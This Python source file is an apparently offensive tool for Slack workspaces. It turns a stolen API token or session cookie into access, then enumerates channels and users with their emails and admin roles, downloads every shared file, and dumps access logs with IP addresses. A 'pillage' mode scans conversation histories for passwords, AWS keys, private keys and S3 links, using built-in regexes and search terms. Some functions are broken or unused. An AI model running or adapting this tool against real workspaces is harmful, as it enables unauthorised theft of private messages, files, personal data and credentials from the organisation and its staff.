import argparse
import requests
import os
from datetime import datetime
import hashlib
import re
import uuid
import urllib3
import sys
sys.path.append('./detect-secrets')  # Adjust the path as needed
from detect_secrets.core.secrets_collection import SecretsCollection
from detect_secrets.settings import transient_settings
import json

verbose = False
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)


ALREADY_SIGNED_IN_TEAM_REGEX = r"([a-zA-Z0-9\-]+\.slack\.com)"
SLACK_API_TOKEN_REGEX = r"(xox[a-zA-Z]-[a-zA-Z0-9-]+)"
WORKSPACE_VALID_EMAILS_REGEX = r"email-domains-formatted=\"(@.+?)[\"]"
PRIVATE_KEYS_REGEX = r"([-]+BEGIN [^\s]+ PRIVATE KEY[-]+[\s]*[^-]*[-]+END [^\s]+ PRIVATE KEY[-]+)"
S3_REGEX = r"(" \
           r"[a-zA-Z0-9-\.\_]+\.s3\.amazonaws\.com" \
           r"|s3://[a-zA-Z0-9-\.\_]+" \
           r"|s3-[a-zA-Z0-9-\.\_\/]+" \
           r"|s3.amazonaws.com/[a-zA-Z0-9-\.\_]+" \
           r"|s3.console.aws.amazon.com/s3/buckets/[a-zA-Z0-9-\.\_]+)"

CREDENTIALS_REGEX = r"(?i)(" \
                    r"password\s*[`=:\"]+\s*[^\s]+|" \
                    r"password is\s*[`=:\"]*\s*[^\s]+|" \
                    r"pwd\s*[`=:\"]*\s*[^\s]+|" \
                    r"passwd\s*[`=:\"]+\s*[^\s]+)"

AWS_KEYS_REGEX = r"(?!com/archives/[A-Z0-9]{9}/p[0-9]{16})" \
                 r"((?<![A-Za-z0-9/+])[A-Za-z0-9/+]{40}(?![A-Za-z0-9/+])|(?<![A-Z0-9])[A-Z0-9]{20}(?![A-Z0-9]))"
S3_QUERIES = ["s3.amazonaws.com", "s3://", "https://s3", "http://s3"]
CREDENTIALS_QUERIES = ["password:", "password is", "pwd", "passwd"]
AWS_KEYS_QUERIES = ["ASIA*", "AKIA*"]
PRIVATE_KEYS_QUERIES = ["BEGIN DSA PRIVATE",
                        "BEGIN EC PRIVATE",
                        "BEGIN OPENSSH PRIVATE",
                        "BEGIN PGP PRIVATE",
                        "BEGIN RSA PRIVATE"]
INTERESTING_FILE_QUERIES = [".config",
                            ".doc",
                            ".docx",
                            "id_rsa",
                            ".key",
                            ".p12",
                            ".pem",
                            ".pfx",
                            ".pkcs12",
                            ".ppk",
                            ".sh",
                            ".sql",
                            "backup",
                            "password",
                            "id_rsa",
                            "pasted image",
                            "secret"]
LINKS_QUERIES = ["amazonaws",
                 "atlassian",
                 "beta",
                 "confluence",
                 "docs.google.com",
                 "github",
                 "internal",
                 "jenkins",
                 "jira",
                 "kubernetes",
                 "sharepoint",
                 "staging",
                 "swagger",
                 "travis",
                 "trello"]

def make_cookie_request(workspace_url, user_cookie, proxy=None, verify_ssl=False):
    try:
        # Remove extra 'd=' if present in the cookie
        user_cookie = re.sub(r'^d=', '', user_cookie)

        response = requests.get(workspace_url, cookies={'d': user_cookie}, proxies={'http': proxy, 'https': proxy}, verify=verify_ssl)
        response.raise_for_status()

        # Extract user session token using regex pattern
        user_session_token_match = re.search(r'(xox[a-zA-Z]-[a-zA-Z0-9-]+)', response.text)
        if user_session_token_match:
            return user_session_token_match.group(0)
        else:
            print("[ERROR]: User session token not found in the response.")
            return None

    except requests.exceptions.RequestException as exception:
        print(f"[ERROR]: {exception}")
        return None


def make_slack_request(url, credentials, method="POST", payload=None, proxy=None, verify_ssl=False):
    if 'token' in credentials:
        headers = {"Authorization": f"Bearer {credentials['token']}"}
    elif 'cookie' in credentials:
        user_session_token = make_cookie_request(credentials['workspace_url'], credentials['cookie'], proxy, verify_ssl)
        if not user_session_token:
            print("[ERROR]: Unable to obtain user session token.")
            return None

        boundary = "----WebKitFormBoundary" + str(uuid.uuid4()).replace("-", "")
        headers = {
            "Content-Type": f"multipart/form-data; boundary={boundary}",
            "Origin": "https://api.slack.com",
            "Cookie": f"{credentials['cookie']}",
        }

        # Create the payload for the POST request
        payload = (
            f"--{boundary}\r\n"
            f"Content-Disposition: form-data; name=\"token\"\r\n\r\n"
            f"{user_session_token}\r\n"
            f"--{boundary}--\r\n"
        )

    #print(f"Making Slack request to {url} with headers: {headers}")

    try:
        if method == "POST":
            response = requests.post(
                url,
                headers=headers,
                data=payload,
                proxies={'http': proxy, 'https': proxy},
                verify=verify_ssl
            )
        else:
            # Assuming GET for simplicity, you can extend this for other methods
            response = requests.get(
                url,
                headers=headers,
                proxies={'http': proxy, 'https': proxy},
                verify=verify_ssl
            )

        response.raise_for_status()
        data = response.json()
        #print(f"Make Slack Request Response JSON: {data}")

        if response.status_code == 200 and data.get("ok"):
            print("Request passed!")
        else:
            print("Request failed.")
            print(f"Error message: {data.get('error', 'N/A')}")

        return data  # Return the entire response object

    except requests.exceptions.RequestException as exception:
        print(f"[ERROR]: {exception}")
        return None  # Return None in case of an exception


def test_credentials(credentials, proxy, verify_ssl=False):
    if 'token' in credentials:
        test_url = "https://slack.com/api/auth.test"
        payload = None  # No payload for token-based authentication

        make_slack_request(test_url, credentials, method="POST", payload=payload, proxy=proxy, verify_ssl=verify_ssl)

    elif 'cookie' in credentials:
        user_session_token = make_cookie_request(credentials['workspace_url'], credentials['cookie'], proxy, verify_ssl)
        if not user_session_token:
            print("[ERROR]: Unable to obtain user session token.")
            return

        test_url = "https://slack.com/api/auth.test"
        make_slack_request(test_url, credentials, method="POST", payload=user_session_token, proxy=proxy, verify_ssl=verify_ssl)



def list_channels(credentials, proxy, verify_ssl=False):
    if 'token' in credentials:
        test_url = "https://slack.com/api/conversations.list"
        payload = None  # No payload for token-based authentication

        response = make_slack_request(test_url, credentials, method="POST", payload=payload, proxy=proxy, verify_ssl=verify_ssl)
        if response:
            channels_list = response.get("channels", [])
            #print("Response JSON:", response)
            return channels_list
        else:
            print("Error in make_slack_request")
            return None

    elif 'cookie' in credentials:
        user_session_token = make_cookie_request(credentials['workspace_url'], credentials['cookie'], proxy, verify_ssl)
        if not user_session_token:
            print("[ERROR]: Unable to obtain user session token.")
            return None

        test_url = "https://slack.com/api/conversations.list"
        response = make_slack_request(test_url, credentials, method="POST", payload=user_session_token, proxy=proxy, verify_ssl=verify_ssl)
        if response:
            channels_list = response.get("channels", [])
            #print("Response JSON:", response)
            return channels_list
        else:
            print("Error in make_slack_request")
            return None



def list_file_urls(credentials, channel, proxy, verify_ssl=False):
    print("LIST_FILE_URLS FUNCTION")
    if 'token' in credentials:
        test_url = "https://slack.com/api/files.list"
        payload = None  # No payload for token-based authentication

        response_data = make_slack_request(test_url, credentials, method="POST", payload=payload, proxy=proxy, verify_ssl=verify_ssl)

    elif 'cookie' in credentials:
        user_session_token = make_cookie_request(credentials['workspace_url'], credentials['cookie'], proxy, verify_ssl)
        if not user_session_token:
            print("[ERROR]: Unable to obtain user session token.")
            return None

        test_url = "https://slack.com/api/files.list"
        response_data = make_slack_request(test_url, credentials, method="POST", payload=user_session_token, proxy=proxy, verify_ssl=verify_ssl)

    if response_data and 'files' in response_data:
        return [file_info["url_private"] for file_info in response_data["files"]]
    else:
        print("[ERROR]: Files information not found in the response.")
        return None




def list_files(credentials, proxy, verbose=False, verify_ssl=False):
    channels = list_channels(credentials, proxy=proxy, verify_ssl=verify_ssl)

    all_file_urls = []
    for channel in channels:
        channel_id = channel['id']
        try:
            file_urls = list_file_urls(credentials, channel_id, proxy=proxy)
            all_file_urls.extend(file_urls)
        except Exception as e:
            print(f"Error retrieving file URLs for channel {channel_id}: {str(e)}")
    return all_file_urls





def download_files(credentials, file_urls, output_directory=None, proxy=None, verify_ssl=False):
    if output_directory:
        os.makedirs(output_directory, exist_ok=True)

    for url in file_urls:
        if 'token' in credentials:
            response = requests.get(url, headers={"Authorization": f"Bearer {credentials['token']}"}, stream=True, proxies={'http': proxy, 'https': proxy}, verify=verify_ssl)
        elif 'cookie' in credentials:
            response = requests.get(url, headers={"Cookie": f"{credentials['cookie']}"}, stream=True, proxies={'http': proxy, 'https': proxy}, verify=verify_ssl)

        if response.status_code == 200:
            if verbose:
                print("Response:", response.text)

            filename = generate_unique_filename(url)
            if output_directory:
                filename = os.path.join(output_directory, filename)

            with open(filename, "wb") as f:
                for chunk in response.iter_content(chunk_size=8192):
                    f.write(chunk)
            print(f"Downloaded: {filename}")
        else:
            print(f"Error downloading: {url}")



def generate_unique_filename(url):
    timestamp = datetime.now().strftime('%Y%m%d%H%M%S')
    unique_id = hashlib.md5(url.encode()).hexdigest()[:4]
    filename = f"{timestamp}_{unique_id}_{url.split('/')[-1]}"
    return filename


def list_user_list(credentials, proxy=None, verify_ssl=False):

    if 'token' in credentials:
        test_url = "https://slack.com/api/users.list"
        payload = None  # No payload for token-based authentication

        response = make_slack_request(test_url, credentials, method="POST", payload=payload, proxy=proxy, verify_ssl=verify_ssl)

        if response is not None and response.get("ok"):
            return response["members"]
        else:
            print("Error retrieving user list.")
            return []


    elif 'cookie' in credentials:
        user_session_token = make_cookie_request(credentials['workspace_url'], credentials['cookie'], proxy, verify_ssl)
        if not user_session_token:
            print("[ERROR]: Unable to obtain user session token.")
            return

        test_url = "https://slack.com/api/users.list"
        payload = None  # No payload for token-based authentication
        response = make_slack_request(test_url, credentials, method="POST", payload=payload, proxy=proxy, verify_ssl=verify_ssl)

        if response is not None and response.get("ok"):
            return response["members"]
        else:
            print("Error retrieving user list.")
            return []

def check_user_membership(credentials, channel_id):
    if 'token' in credentials:
        url = f"https://slack.com/api/conversations.members?channel={channel_id}"
        headers = {"Authorization": f"Bearer {credentials['token']}"}
    elif 'cookie' in credentials:
        url = f"https://slack.com/api/conversations.members?channel={channel_id}"  # Use the correct Slack API endpoint for cookie-based authentication
        headers = {"Cookie": f"{credentials['cookie']}"}

    response = requests.get(url, headers=headers)
    data = response.json()
    if response.status_code == 200 and data.get("ok"):
        return True
    return False


def check_permissions(credentials):
    if 'token' in credentials:
        # perms for files.list
        files_list_url = "https://slack.com/api/files.list?limit=1"
        files_list_headers = {"Authorization": f"Bearer {credentials['token']}"}
        files_list_response = requests.get(files_list_url, headers=files_list_headers)
        files_list_data = files_list_response.json()
        files_list_permission = "files:read" if files_list_data.get("ok") else None

        # perms for users.list
        users_list_url = "https://slack.com/api/users.list?limit=1"
        users_list_headers = {"Authorization": f"Bearer {credentials['token']}"}
        users_list_response = requests.get(users_list_url, headers=users_list_headers)
        users_list_data = users_list_response.json()
        users_list_permission = "users:read" if users_list_data.get("ok") else None

        # perms for conversations.list
        conversations_list_url = "https://slack.com/api/conversations.list?limit=1"
        conversations_list_headers = {"Authorization": f"Bearer {credentials['token']}"}
        conversations_list_response = requests.get(conversations_list_url, headers=conversations_list_headers)
        conversations_list_data = conversations_list_response.json()
        conversations_list_permission = "conversations:read" if conversations_list_data.get("ok") else None

        dump_logs_permission = check_dump_logs_permission(credentials['token'])

        available_flags = []

        if files_list_permission:
            available_flags.append("--list-file-urls")
            available_flags.append("--list-files")

        if users_list_permission:
            available_flags.append("--list-users")

        if conversations_list_permission:
            available_flags.append("--list-channels")

        if dump_logs_permission:
            available_flags.append("--dump-logs")

        return {
            "API Token Permissions": {
                "files.list": files_list_permission,
                "users.list": users_list_permission,
                "conversations.list": conversations_list_permission,
            },
            "Available Flags": available_flags,
        }

    elif 'cookie' in credentials:

        files_list_url = "https://slack.com/api/files.list?limit=1"
        files_list_headers = {"Cookie": f"{credentials['cookie']}"}

        users_list_url = "https://slack.com/api/users.list?limit=1"
        users_list_headers = {"Cookie": f"{credentials['cookie']}"}

        conversations_list_url = "https://slack.com/api/conversations.list?limit=1"
        conversations_list_headers = {"Cookie": f"{credentials['cookie']}"}

        dump_logs_permission = check_dump_logs_permission(credentials)

        available_flags = []

        # Check permissions for files.lists
        files_list_response = requests.get(files_list_url, headers=files_list_headers)
        files_list_data = files_list_response.json()
        files_list_permission = "files:read" if files_list_data.get("ok") else None

        # Check permissions for users.list
        users_list_response = requests.get(users_list_url, headers=users_list_headers)
        users_list_data = users_list_response.json()
        users_list_permission = "users:read" if users_list_data.get("ok") else None

        # Check permissions for conversations.list
        conversations_list_response = requests.get(conversations_list_url, headers=conversations_list_headers)
        conversations_list_data = conversations_list_response.json()
        conversations_list_permission = "conversations:read" if conversations_list_data.get("ok") else None

        if files_list_permission:
            available_flags.append("--list-file-urls")
            available_flags.append("--list-files")

        if users_list_permission:
            available_flags.append("--list-users")

        if conversations_list_permission:
            available_flags.append("--list-channels")

        if dump_logs_permission:
            available_flags.append("--dump-logs")

        return {
            "API Token Permissions": {
                "files.list": files_list_permission,
                "users.list": users_list_permission,
                "conversations.list": conversations_list_permission,
            },
            "Available Flags": available_flags,
        }

def check_dump_logs_permission(token):

    return True

def dump_logs(token, verbose=False):
    url = "https://slack.com/api/team.accessLogs"
    headers = {"Authorization": f"Bearer {token}"}
    response = requests.get(url, headers=headers)
    data = response.json()

    if response.status_code == 200 and data.get("ok"):
        print("Team Access Logs:")
        for log_entry in data["logins"]:
            print(f"User ID: {log_entry['user_id']}")
            print(f"Username: {log_entry['username']}")
            print(f"Date: {unix_timestamp_to_human_readable(log_entry['date'])}")
            print(f"IP Address: {log_entry['ip']}")
            print()
    else:
        print("Error retrieving team access logs.")
        print("Response:", response.text)
        #if verbose:
        #    print("Response:", response.text)


def unix_timestamp_to_human_readable(epoch_time):
    try:
        timestamp_in_seconds = epoch_time / 1000  # converts to seconds
        return datetime.utcfromtimestamp(timestamp_in_seconds).strftime('%Y-%m-%d %H:%M:%S UTC')
    except ValueError:
        return "N/A"












def pillage_conversations(credentials, proxy, verify_ssl=False):
    all_conversations = list_channels(credentials, proxy=proxy, verify_ssl=verify_ssl)

    secrets_collection = SecretsCollection()

    for conversation in all_conversations:
        conversation_id = conversation['id']
        conversation_name = conversation.get('name', 'N/A')
        messages = retrieve_conversation_messages(credentials, conversation_id, proxy=proxy, verify_ssl=verify_ssl)

        for message in messages:
            text = message.get('text', '')
            find_secrets_in_text(text, secrets_collection)



def retrieve_conversation_messages(credentials, conversation_id, proxy, verify_ssl=False):
    if 'token' in credentials:
        test_url = f"https://slack.com/api/conversations.history?channel={conversation_id}"
        payload = None  # No payload for token-based authentication

        response = make_slack_request(test_url, credentials, method="GET", payload=payload, proxy=proxy, verify_ssl=verify_ssl)

    elif 'cookie' in credentials:
        user_session_token = make_cookie_request(credentials['workspace_url'], credentials['cookie'], proxy, verify_ssl)
        if not user_session_token:
            print("[ERROR]: Unable to obtain user session token.")
            return []

        test_url = f"https://slack.com/api/conversations.history?channel={conversation_id}"
        payload = {"token": user_session_token}
        response = make_slack_request(test_url, credentials, method="POST", payload=payload, proxy=proxy, verify_ssl=verify_ssl)

    if response and response.get("ok"):
        return response.get("messages", [])
    else:
        print(f"Error retrieving messages for conversation {conversation_id}")
        return []




def find_secrets_in_text(text, secrets_collection):
    # Add the entire text as a potential secret with type 'Token'
    secrets_collection.add_line("filename", text, "Token")

    # Print the original text before scanning
    print(f"Original text: {text}")

    # Run the scan operation on the provided text
    secrets_collection.scan()

    # Ensure that secrets_collection.json() returns a list of dictionaries
    secrets = secrets_collection.json()

    if secrets:
        print(f"Potential secrets found in message: {text}")
        for secret in secrets:
            if isinstance(secret, dict):
                if 'type' in secret and 'filename' in secret and 'is_verified' in secret:
                    print(f"Type: {secret['type']}, Filename: {secret['filename']}, Is Verified: {secret['is_verified']}")
                elif 'Unexpected secret format: filename' not in str(secret):
                    # Skip the output when encountering the specific message
                    print(f"Unexpected secret format: {secret}")
            else:
                print(f"Unexpected secret format: {secret}")











def main():
    parser = argparse.ArgumentParser(description="Download files from Slack channels")
    group = parser.add_mutually_exclusive_group(required=True)
    group.add_argument("--token", type=str, help="Slack API token")
    group.add_argument("--cookie", type=str, help="User-supplied cookie")
    group.add_argument("--user-cookie", type=str, help="User session cookie (e.g., xoxd-...)")
    parser.add_argument("--workspace-url", type=str, help="Workspace URL for authenticating user session token")
    
    parser.add_argument("--pillage", action='store_true', help="Search conversations for secrets")

    parser.add_argument("--test", action='store_true', help="Test Slack credentials")
    parser.add_argument("--list-file-urls", action='store_true', help="Get file URLs")
    parser.add_argument("--download-files", action='store_true', help="Download files")
    parser.add_argument("--output-directory", type=str, help="Output directory for downloaded files")
    parser.add_argument("--list-users", action='store_true', help="Get list of users")
    parser.add_argument("--list-channels", action='store_true', help="Get list of channels")
    parser.add_argument("--check-permissions", action='store_true', help="Check API token permissions")
    parser.add_argument("--list-files", action='store_true', help="List all files from all channels")
    parser.add_argument("--dump-logs", action='store_true', help="Dump team access logs")
    parser.add_argument("--verbose", "-v", action='store_true', help="Enable verbose logging for troubleshooting")
    parser.add_argument("--proxy", "-p", type=str, help="Specify a proxy (e.g., 127.0.0.1:8080)")

    args = parser.parse_args()

    args = parser.parse_args()

    secrets_collection = SecretsCollection()


    credentials = {}
    if args.token:
        credentials['token'] = args.token
    elif args.cookie:
        credentials['cookie'] = args.cookie
        credentials['workspace_url'] = args.workspace_url

    if args.proxy:
        proxy = args.proxy
    else:
        proxy = None

    if args.test:
        test_credentials(credentials, proxy)

    elif args.list_channels:
        channel_list = list_channels(credentials, proxy)
        user_membership = []

        for channel in channel_list:
            channel_id = channel['id']
            is_member = check_user_membership(credentials, channel_id)
            user_membership.append((channel_id, is_member))

        print("List of Channels:")
        print()
        for channel in channel_list:
            is_member = next((item[1] for item in user_membership if item[0] == channel['id']), False)
            print(f"Name: {channel['name']}")
            print(f"ID: {channel['id']}")
            print(f"Value: {channel.get('value', 'N/A')}")
            print(f"Created: {unix_timestamp_to_human_readable(channel.get('created', 0))}")
            print(f"Last Updated: {unix_timestamp_to_human_readable(channel.get('updated', 0))}")
            print(f"Context Team ID: {channel.get('context_team_id', 'N/A')}")
            print(f"Creator: {channel.get('creator', 'N/A')}")
            print(f"Is Supplied Token Member: {'Yes' if is_member else 'No'}")
            print()

    elif args.list_file_urls:
        channel_list = list_channels(credentials, proxy)
        for channel in channel_list:
            channel_id = channel['id']
            list_file_urls(credentials, channel_id, proxy)

    elif args.list_files:
        all_file_urls = list_files(credentials, proxy)  # Pass the verbose flag
        print("List of All File URLs:")
        for file_url in all_file_urls:
            print(file_url)

    elif args.download_files:
        channel_list = list_channels(credentials, proxy=proxy)
        all_file_urls = []
        for channel in channel_list:
            # Extract the channel_id from the channel dictionary
            channel_id = channel['id']
            file_urls = list_file_urls(credentials, channel_id, proxy=proxy)
            all_file_urls.extend(file_urls)
        download_files(credentials, all_file_urls, args.output_directory, proxy=proxy)

    elif args.list_users:
        user_list = list_user_list(credentials, proxy=proxy)
        print("List of users:")
        print()

        for user in user_list:
            print(f"User ID: {user['id']}")
            print(f"Username: {user['name']}")
            #print(f"Real Name: {user['real_name']}")
            print(f"Real Name: {user['profile'].get('real_name')}")
            display_name = user['profile'].get('display_name_normalized', 'N/A')
            print(f"Display Name: {display_name}")
            email = user['profile'].get('email', 'N/A')
            print(f"Email: {email}")

            is_admin = "Yes" if user.get('is_admin', False) else "No"
            print(f"Is Admin: {is_admin}")

            is_owner = "Yes" if user.get('is_owner', False) else "No"
            print(f"Is Owner: {is_owner}")

            is_primary_owner = "Yes" if user.get('is_primary_owner', False) else "No"
            print(f"Is Primary Owner: {is_primary_owner}")

            print()

    elif args.check_permissions:
        permissions = check_permissions(credentials)
        print("API Token Permissions:")
        for endpoint, permission in permissions['API Token Permissions'].items():
            print(f"{endpoint}: {permission}")

        print()
        print("Available Flags:")
        for flag in permissions['Available Flags']:
            print(flag)

    elif args.dump_logs:
        dump_logs(credentials, proxy)

    if args.pillage:
        pillage_conversations(credentials, proxy=proxy)


if __name__ == "__main__":
    main() 